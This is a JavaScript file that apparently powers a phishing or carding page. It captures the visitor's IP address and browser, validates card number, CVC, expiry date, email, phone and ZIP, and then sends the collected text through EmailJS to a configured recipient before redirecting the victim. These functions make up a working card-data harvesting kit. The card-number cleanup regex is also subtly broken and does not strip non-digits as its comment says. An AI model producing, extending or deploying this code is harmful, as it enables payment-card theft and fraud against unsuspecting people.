function browserN(){if((navigator.userAgent.indexOf("Opera")||navigator.userAgent.indexOf('OPR'))!=-1){return'Opera'}else if(navigator.userAgent.indexOf("Edg")!=-1){return'Edge'}else if(navigator.userAgent.indexOf("Chrome")!=-1){return'Chrome'}else if(navigator.userAgent.indexOf("Safari")!=-1){return'Safari'}else if(navigator.userAgent.indexOf("Firefox")!=-1){return'Firefox'}else if((navigator.userAgent.indexOf("MSIE")!=-1)||(!!document.documentMode==!0)){return'IE'}else{return'unknown'}}
function fetch_ip(){$.getJSON("https://api.ipify.org?format=json",function(data){$("#eip").val(data.ip)})}
function is_valid(email){
  const regex = /^[^\s@]+@[^\s@]+\.[^\s@]+$/;
  if(regex.test(email)){
  return true;
  }else{
  return false;
  }
}

function isValidCVC(cvc) {
  // Remove any potential whitespace
  const sanitizedCvc = cvc.trim();
  // A general regex for 3 or 4 digits
  const generalRegex = /^[0-9]{3,4}$/;

  return generalRegex.test(sanitizedCvc);
}


function isValidEx(value) {
    // 1. Check format using a regular expression (MM/YY or MM/YYYY)
    // Supports 01-12 for month and a 2 or 4 digit year
    if (!/^(0[1-9]|1[0-2])\/?([0-9]{2}|[0-9]{4})$/.test(value)) {
        return false;
    }

    // Split the input into month and year parts
    const parts = value.split('/');
    let month = parseInt(parts[0], 10);
    let year = parseInt(parts[1], 10);

    // If year is 2 digits, convert to 4 digits (e.g., 25 becomes 2025)
    if (year < 100) {
        year += 2000;
    }

    // 2. Check if the date is in the past
    const today = new Date();
    // Normalize today's date to the first day of the current month at midnight
    const currentMonth = today.getMonth() + 1; // getMonth() returns 0-11
    const currentYear = today.getFullYear();

    // The card expires at the end of the specified month. We create a date object
    // for the first day of the *next* month after the expiry to check against
    const expiryDate = new Date(year, month, 1); // month is 0-indexed in Date constructor, but using 'month' directly here to represent the *next* month's start, then compare with today.

    // An alternative (simpler) approach is to compare year and month directly
    if (year < currentYear || (year === currentYear && month < currentMonth)) {
        return false; // Date is in the past
    }

    return true; // Date is valid and in the future
}


function isValidCC(cardNumber) {
    // Convert to string and remove any non-digit characters (e.g., spaces, hyphens)
    cardNumber = cardNumber.toString().replace(/\\D/g, '');

    let sum = 0;
    let shouldDouble = false;
    // Loop through digits from right to left
    for (let i = cardNumber.length - 1; i >= 0; i--) {
        let digit = parseInt(cardNumber[i], 10);

        if (shouldDouble) {
            digit *= 2;
            // If the result is greater than 9, subtract 9 (e.g., 16 -> 1+6=7, which is 16-9)
            if (digit > 9) {
                digit -= 9;
            }
        }

        sum += digit;
        // Toggle shouldDouble for the next iteration
        shouldDouble = !shouldDouble;
    }

    // The card number is valid if the total sum is divisible by 10
    return sum % 10 === 0;
}

function isValidPhone(phoneNumber) {
    const regex = /^(1\s?)?(\(\d{3}\)|\d{3})[\s\-]?\d{3}[\s\-]?\d{4}$/;
    return regex.test(phoneNumber);
}

function isValidZip(str) {
  const regexp = /^[0-9]{5}(?:-[0-9]{4})?$/;
  return regexp.test(str);
}


function notify(title, message, url, is_subm){
  const data  = {
    title: title,
    text: message
  };

  emailjs.send(SERVICE_KEY, TEMPLATE_KEY, data)
    .then(function(response) {

      if(is_subm > 1){
        window.location.href = url;
      }
      
      console.log('SUCCESS!', response.status, response.text);

    }, function(error) {
      console.log('FAILED...', error);
    });



}

